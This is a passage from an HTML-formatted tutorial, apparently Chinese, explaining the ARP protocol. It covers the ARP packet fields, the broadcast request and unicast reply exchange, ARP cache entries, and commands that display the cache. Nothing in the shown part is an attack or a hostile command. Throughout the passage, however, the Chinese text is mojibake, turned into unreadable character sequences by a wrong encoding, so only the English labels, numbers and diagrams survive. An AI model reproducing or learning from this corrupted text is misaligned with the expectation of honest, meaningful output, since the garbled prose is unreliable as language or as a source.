ä½¿ç”¨å•æ’­åº”ç­”<br>âœ… ç»´æŠ¤ARPç¼“å­˜è¡¨<br><br>åè®®ç±»å‹ï¼š<br><span class="hljs-bullet">- </span>ä»¥å¤ªç½‘ç±»å‹å­—æ®µï¼š0x0806ï¼ˆARPï¼‰<br><span class="hljs-bullet">- </span>ä½äºOSIæ¨¡å‹ç¬¬2å±‚å’Œç¬¬3å±‚ä¹‹é—´<br></code></pre></td></tr></table></figure><h3 id="1-2-ä¸ºä»€ä¹ˆéœ€è¦åœ°å€æ˜ å°„ï¼Ÿ"><a href="#1-2-ä¸ºä»€ä¹ˆéœ€è¦åœ°å€æ˜ å°„ï¼Ÿ" class="headerlink" title="1.2 ä¸ºä»€ä¹ˆéœ€è¦åœ°å€æ˜ å°„ï¼Ÿ"></a>1.2 ä¸ºä»€ä¹ˆéœ€è¦åœ°å€æ˜ å°„ï¼Ÿ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ç½‘ç»œé€šä¿¡çš„ä¸¤ç§åœ°å€ï¼š<br><br><span class="hljs-bullet">1.</span> IPåœ°å€ï¼ˆé€»è¾‘åœ°å€ï¼‰<br><span class="hljs-bullet">   -</span> 32ä½ï¼ˆIPv4ï¼‰<br><span class="hljs-bullet">   -</span> å±‚æ¬¡åŒ–<br><span class="hljs-bullet">   -</span> å¯è·¯ç”±<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š192.168.1.10<br><br><span class="hljs-bullet">2.</span> MACåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰<br><span class="hljs-bullet">   -</span> 48ä½<br><span class="hljs-bullet">   -</span> æ‰å¹³åŒ–<br><span class="hljs-bullet">   -</span> ä¸å¯è·¯ç”±<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šaa:bb:cc:dd:ee:ff<br><br>ä¸ºä»€ä¹ˆä¸¤ç§åœ°å€ï¼Ÿ<br><br>IPåœ°å€ï¼š<br>âœ… å…¨å±€å”¯ä¸€ï¼ˆç†è®ºä¸Šï¼‰<br>âœ… å±‚æ¬¡åŒ–ï¼Œæ”¯æŒè·¯ç”±<br>âœ… å¯ä»¥åŠ¨æ€åˆ†é…<br>âœ… ä¾¿äºç½‘ç»œç®¡ç†<br><br>MACåœ°å€ï¼š<br>âœ… ç¡¬ä»¶å†…ç½®<br>âœ… ç½‘å¡çº§åˆ«å”¯ä¸€<br>âœ… ä¸éœ€è¦é…ç½®<br>âœ… æ•°æ®é“¾è·¯å±‚ä½¿ç”¨<br><br>æ•°æ®ä¼ è¾“æµç¨‹ï¼š<br>åº”ç”¨å±‚ï¼šä½¿ç”¨åŸŸåï¼ˆwww.google.comï¼‰<br>   â†“ DNS<br>ç½‘ç»œå±‚ï¼šä½¿ç”¨IPåœ°å€ï¼ˆ142.250.185.14ï¼‰<br>   â†“ ARP<br>æ•°æ®é“¾è·¯å±‚ï¼šä½¿ç”¨MACåœ°å€ï¼ˆaa:bb:cc:dd:ee:ffï¼‰<br>   â†“<br>ç‰©ç†å±‚ï¼šç”µä¿¡å·ä¼ è¾“<br><br>ARPæ˜¯å…³é”®çš„æ¡¥æ¢ï¼<br></code></pre></td></tr></table></figure><hr><h2 id="2-ARPå·¥ä½œåŸç†"><a href="#2-ARPå·¥ä½œåŸç†" class="headerlink" title="2. ARPå·¥ä½œåŸç†"></a>2. ARPå·¥ä½œåŸç†</h2><h3 id="2-1-ARPæŠ¥æ–‡æ ¼å¼"><a href="#2-1-ARPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="2.1 ARPæŠ¥æ–‡æ ¼å¼"></a>2.1 ARPæŠ¥æ–‡æ ¼å¼</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ARPæŠ¥æ–‡æ ¼å¼ï¼ˆ28å­—èŠ‚ï¼‰ï¼š<br><br><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|       Hardware Type           |       Protocol Type           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|  HW Addr Len  | Proto Addr Len|          Operation            |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Sender Hardware Address                     |<br><span class="hljs-section">|                        (6 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Sender Protocol Address                     |<br><span class="hljs-section">|                        (4 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Target Hardware Address                     |<br><span class="hljs-section">|                        (6 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Target Protocol Address                     |<br><span class="hljs-section">|                        (4 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>å­—æ®µè¯´æ˜ï¼š<br><br>Hardware Type (ç¡¬ä»¶ç±»å‹, 16ä½):<br><span class="hljs-bullet">- </span>1 = ä»¥å¤ªç½‘<br><span class="hljs-bullet">- </span>6 = IEEE 802ç½‘ç»œ<br><span class="hljs-bullet">- </span>7 = ARCnet<br><br>Protocol Type (åè®®ç±»å‹, 16ä½):<br><span class="hljs-bullet">- </span>0x0800 = IPv4<br><span class="hljs-bullet">- </span>ä¸ä»¥å¤ªç½‘ç±»å‹å­—æ®µç›¸åŒ<br><br>Hardware Address Length (ç¡¬ä»¶åœ°å€é•¿åº¦, 8ä½):<br><span class="hljs-bullet">- </span>ä»¥å¤ªç½‘ = 6ï¼ˆå­—èŠ‚ï¼‰<br><br>Protocol Address Length (åè®®åœ°å€é•¿åº¦, 8ä½):<br><span class="hljs-bullet">- </span>IPv4 = 4ï¼ˆå­—èŠ‚ï¼‰<br><br>Operation (æ“ä½œ, 16ä½):<br><span class="hljs-bullet">- </span>1 = ARPè¯·æ±‚ï¼ˆARP Requestï¼‰<br><span class="hljs-bullet">- </span>2 = ARPåº”ç­”ï¼ˆARP Replyï¼‰<br><span class="hljs-bullet">- </span>3 = RARPè¯·æ±‚<br><span class="hljs-bullet">- </span>4 = RARPåº”ç­”<br><br>Sender Hardware Address (å‘é€æ–¹ç¡¬ä»¶åœ°å€, 6å­—èŠ‚):<br><span class="hljs-bullet">- </span>å‘é€æ–¹çš„MACåœ°å€<br><br>Sender Protocol Address (å‘é€æ–¹åè®®åœ°å€, 4å­—èŠ‚):<br><span class="hljs-bullet">- </span>å‘é€æ–¹çš„IPåœ°å€<br><br>Target Hardware Address (ç›®æ ‡ç¡¬ä»¶åœ°å€, 6å­—èŠ‚):<br><span class="hljs-bullet">- </span>è¯·æ±‚æ—¶ä¸ºå…¨0æˆ–FF:FF:FF:FF:FF:FF<br><span class="hljs-bullet">- </span>åº”ç­”æ—¶ä¸ºç›®æ ‡MACåœ°å€<br><br>Target Protocol Address (ç›®æ ‡åè®®åœ°å€, 4å­—èŠ‚):<br><span class="hljs-bullet">- </span>ç›®æ ‡çš„IPåœ°å€<br></code></pre></td></tr></table></figure><h3 id="2-2-ARPè¯·æ±‚å’Œåº”ç­”"><a href="#2-2-ARPè¯·æ±‚å’Œåº”ç­”" class="headerlink" title="2.2 ARPè¯·æ±‚å’Œåº”ç­”"></a>2.2 ARPè¯·æ±‚å’Œåº”ç­”</h3><p><strong>ARPè¯·æ±‚ï¼ˆARP Requestï¼‰</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs dns">åœºæ™¯ï¼š<br>ä¸»æœº<span class="hljs-keyword">A</span>ï¼ˆ<span class="hljs-number">192.168.1.10</span>, MAC: <span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>ï¼‰<br>æƒ³å‘é€æ•°æ®ç»™<br>ä¸»æœºBï¼ˆ<span class="hljs-number">192.168.1.20</span>, MAC: æœªçŸ¥ï¼‰<br><br>ARPè¯·æ±‚æµç¨‹ï¼š<br><br><span class="hljs-number">1</span>. ä¸»æœº<span class="hljs-keyword">A</span>æ„é€ ARPè¯·æ±‚åŒ…ï¼š<br>   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>   â”‚ ä»¥å¤ªç½‘å¤´éƒ¨                        â”‚<br>   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>   â”‚ ç›®æ ‡MAC: FF:FF:FF:FF:FF:FF (å¹¿æ’­) â”‚<br>   â”‚ æºMAC: <span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>         â”‚<br>   â”‚ ç±»å‹: <span class="hljs-number">0</span>x0806 (ARP)               â”‚<br>   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>   â”‚ ARPæŠ¥æ–‡                          â”‚<br>   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>   â”‚ æ“ä½œ: <span class="hljs-number">1</span> (è¯·æ±‚)                   â”‚<br>   â”‚ å‘é€æ–¹MAC: <span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>     â”‚<br>   â”‚ å‘é€æ–¹IP: <span class="hljs-number">192.168.1.10</span>           â”‚<br>   â”‚ ç›®æ ‡MAC: <span class="hljs-number">00:00:00:00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>       â”‚<br>   â”‚ ç›®æ ‡IP: <span class="hljs-number">192.168.1.20</span>             â”‚<br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><span class="hljs-number">2</span>. å¹¿æ’­å‘é€åˆ°å±€åŸŸç½‘<br>   - æ‰€æœ‰ä¸»æœºéƒ½èƒ½æ”¶åˆ°<br>   - ç›®æ ‡MACæ˜¯å¹¿æ’­åœ°å€<br><br><span class="hljs-number">3</span>. å±€åŸŸç½‘å†…æ‰€æœ‰ä¸»æœºæ¥æ”¶ï¼š<br>   - ä¸»æœºC: IPä¸æ˜¯<span class="hljs-number">192.168.1.20</span>ï¼Œå¿½ç•¥<br>   - ä¸»æœºD: IPä¸æ˜¯<span class="hljs-number">192.168.1.20</span>ï¼Œå¿½ç•¥<br>   - ä¸»æœºB: IPæ˜¯<span class="hljs-number">192.168.1.20</span>ï¼Œå¤„ç†ï¼<br></code></pre></td></tr></table></figure><p><strong>ARPåº”ç­”ï¼ˆARP Replyï¼‰</strong>ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">ä¸»æœºBæ”¶åˆ°ARPè¯·æ±‚åï¼š</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">1. ä¸»æœºBæ„é€ ARPåº”ç­”åŒ…ï¼š</span><br><span class="hljs-attribute">   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-attribute">   â”‚ ä»¥å¤ªç½‘å¤´éƒ¨                        â”‚</span><br><span class="hljs-attribute">   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="hljs-attribute">   â”‚ ç›®æ ‡MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">11:11:11:11:11:11       â”‚</span><br>   <span class="hljs-attribute">â”‚ æºMAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">22:22:22:22:22:22         â”‚</span><br>   <span class="hljs-attribute">â”‚ ç±»å‹</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0806 (ARP)               â”‚</span><br>   <span class="hljs-attribute">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="hljs-attribute">   â”‚ ARPæŠ¥æ–‡                          â”‚</span><br><span class="hljs-attribute">   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="hljs-attribute">   â”‚ æ“ä½œ</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2 (åº”ç­”)                   â”‚</span><br>   <span class="hljs-attribute">â”‚ å‘é€æ–¹MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">22:22:22:22:22:22     â”‚</span><br>   <span class="hljs-attribute">â”‚ å‘é€æ–¹IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.20           â”‚</span><br>   <span class="hljs-attribute">â”‚ ç›®æ ‡MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">11:11:11:11:11:11       â”‚</span><br>   <span class="hljs-attribute">â”‚ ç›®æ ‡IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.10             â”‚</span><br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>2. å•æ’­å‘é€ç»™ä¸»æœºA<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ä¸æ˜¯å¹¿æ’­ï¼Œç›´æ¥å‘é€</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç›®æ ‡MACæ˜¯è¯·æ±‚æ–¹çš„MAC</span><br><br>3. ä¸»æœºAæ¥æ”¶åº”ç­”ï¼š<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">è®°å½•åˆ°ARPç¼“å­˜</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">192.168.1.20 â†’ 22:22:22:22:22:22</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç°åœ¨å¯ä»¥å‘é€æ•°æ®äº†ï¼</span><br></code></pre></td></tr></table></figure><p><strong>å®Œæ•´äº¤äº’æµç¨‹</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dns">ä¸»æœº<span class="hljs-keyword">A</span> (<span class="hljs-number">192.168.1.10</span>)               ä¸»æœºB (<span class="hljs-number">192.168.1.20</span>)<br><span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>                  <span class="hljs-number">22:22:22:22</span>:<span class="hljs-number">22</span>:<span class="hljs-number">22</span><br>      â”‚                                   â”‚<br>      â”‚                                   â”‚<br>      â”‚  ARP Request (å¹¿æ’­)                â”‚<br>      â”‚  &quot;è°æ˜¯<span class="hljs-number">192.168.1.20</span>ï¼Ÿ               â”‚<br>      â”‚   æˆ‘æ˜¯<span class="hljs-number">192.168.1.10</span>&quot;                â”‚<br>      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚<br>      â”‚                                   â”‚<br>      â”‚                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>      â”‚                          â”‚ æ£€æŸ¥IP â”‚<br>      â”‚                          â”‚ æ˜¯æˆ‘ï¼ â”‚<br>      â”‚                          â””â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>      â”‚                                   â”‚<br>      â”‚  ARP Reply (å•æ’­)                  â”‚<br>      â”‚  &quot;æˆ‘æ˜¯<span class="hljs-number">192.168.1.20</span>                 â”‚<br>      â”‚   æˆ‘çš„MACæ˜¯<span class="hljs-number">22:22:22:22</span>:<span class="hljs-number">22</span>:<span class="hljs-number">22</span>&quot;      â”‚<br>      â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚<br>      â”‚                                   â”‚<br> â”Œâ”€â”€â”€â”€â”¤                                   â”‚<br> â”‚ç¼“å­˜â”‚                                   â”‚<br> â”‚æ˜ å°„â”‚                                   â”‚<br> â””â”€â”€â”€â”€â”¤                                   â”‚<br>      â”‚                                   â”‚<br>      â”‚  å¼€å§‹å‘é€æ•°æ®                      â”‚<br>      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚<br>      â”‚                                   â”‚<br><br>æ—¶é—´ï¼šçº¦å‡ æ¯«ç§’<br></code></pre></td></tr></table></figure><h3 id="2-3-ARPç¼“å­˜"><a href="#2-3-ARPç¼“å­˜" class="headerlink" title="2.3 ARPç¼“å­˜"></a>2.3 ARPç¼“å­˜</h3><p><strong>ä»€ä¹ˆæ˜¯ARPç¼“å­˜ï¼Ÿ</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ARPç¼“å­˜ = ARPè¡¨ = ARP Cache<br><br>ä½œç”¨ï¼š<br><span class="hljs-bullet">-</span> å­˜å‚¨IPåœ°å€åˆ°MACåœ°å€çš„æ˜ å°„<br><span class="hljs-bullet">-</span> é¿å…é‡å¤ARPè¯·æ±‚<br><span class="hljs-bullet">-</span> æé«˜é€šä¿¡æ•ˆç‡<br><br>å†…å®¹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”<br>â”‚   IPåœ°å€        â”‚      MACåœ°å€        â”‚  ç±»å‹   â”‚ å‰©ä½™ â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ 192.168.1.1     â”‚ aa:bb:cc:dd:ee:ff   â”‚ åŠ¨æ€    â”‚ 120s â”‚<br>â”‚ 192.168.1.20    â”‚ 11:22:33:44:55:66   â”‚ åŠ¨æ€    â”‚ 300s â”‚<br>â”‚ 192.168.1.100   â”‚ 00:11:22:33:44:55   â”‚ é™æ€    â”‚  -   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”˜<br><br>ç¼“å­˜ç±»å‹ï¼š<br><br><span class="hljs-bullet">1.</span> åŠ¨æ€æ¡ç›®ï¼ˆDynamicï¼‰<br><span class="hljs-bullet">   -</span> é€šè¿‡ARPè¯·æ±‚/åº”ç­”è·å¾—<br><span class="hljs-bullet">   -</span> æœ‰è¶…æ—¶æ—¶é—´ï¼ˆé€šå¸¸2-20åˆ†é’Ÿï¼‰<br><span class="hljs-bullet">   -</span> è¶…æ—¶ååˆ é™¤ï¼Œä¸‹æ¬¡é‡æ–°ARP<br><br><span class="hljs-bullet">2.</span> é™æ€æ¡ç›®ï¼ˆStaticï¼‰<br><span class="hljs-bullet">   -</span> æ‰‹åŠ¨æ·»åŠ <br><span class="hljs-bullet">   -</span> æ°¸ä¹…æœ‰æ•ˆï¼ˆé‡å¯å¤±æ•ˆï¼‰<br><span class="hljs-bullet">   -</span> ä¸ä¼šè¢«è¦†ç›–<br><span class="hljs-bullet">   -</span> ç”¨äºå®‰å…¨æˆ–ç‰¹æ®Šéœ€æ±‚<br><br>å·¥ä½œæµç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> éœ€è¦å‘é€æ•°æ®åˆ°æŸIP<br><span class="hljs-bullet">2.</span> æŸ¥æ‰¾ARPç¼“å­˜<br><span class="hljs-bullet">   -</span> æ‰¾åˆ°ï¼Ÿä½¿ç”¨ç¼“å­˜çš„MACåœ°å€<br><span class="hljs-bullet">   -</span> æ²¡æ‰¾åˆ°ï¼Ÿå‘é€ARPè¯·æ±‚<br><span class="hljs-bullet">3.</span> æ”¶åˆ°ARPåº”ç­”åæ›´æ–°ç¼“å­˜<br><span class="hljs-bullet">4.</span> ä½¿ç”¨MACåœ°å€å‘é€æ•°æ®<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ARPç¼“å­˜</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Linux/macOS:<br>$ arp -a<br>? (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>) at aa:bb:cc:dd:ee:ff <span class="hljs-string">[ether]</span> on eth0<br>? (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span>) at <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span> <span class="hljs-string">[ether]</span> on eth0<br><br>$ ip neigh show<br><span class="hljs-number">192.168.1.1</span> dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE<br><span class="hljs-number">192.168.1.20</span> dev eth0 lladdr <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span> STALE<br><br>Windows:<br>C:\&gt; arp -a<br>Interface: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span> --- 0x3<br>  Internet Address      Physical Address      Type<br>  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>           aa-bb-cc-dd-ee-ff     dynamic<br>  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span>          <span class="hljs-number">11</span>-<span class="hljs-number">22</span>-<span 